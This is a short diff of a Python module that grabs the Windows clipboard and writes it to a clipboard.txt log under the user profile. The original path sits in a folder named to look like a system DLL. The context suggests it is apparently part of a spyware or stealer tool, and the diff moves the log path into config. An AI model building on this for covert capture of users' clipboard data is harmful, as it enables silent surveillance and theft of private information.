@@ -11,11 +11,13 @@
 #-----------------------------------------------------------------------------#
 
 from win32clipboard import OpenClipboard, GetClipboardData, CloseClipboard
-from os import environ, sep
+from os import environ
 from manager.logger import Log
+from preferences.config import config
 
 def ClipBoard():
-    pathtofile = environ['USERPROFILE'] + sep + r'AppData\Local\windll'
+    user = environ['USERPROFILE']
+    pathToLogs = f'{user}\\{config.pathToLogs}\\System'
     try:
         OpenClipboard()
         data = GetClipboardData()
@@ -25,5 +27,5 @@ def ClipBoard():
         
     finally:
         CloseClipboard()
-        with open(pathtofile+"\\System\\clipboard.txt", 'w', encoding='UTF-8') as f:
+        with open(pathToLogs+"\\clipboard.txt", 'w', encoding='UTF-8') as f:
             f.write(data)
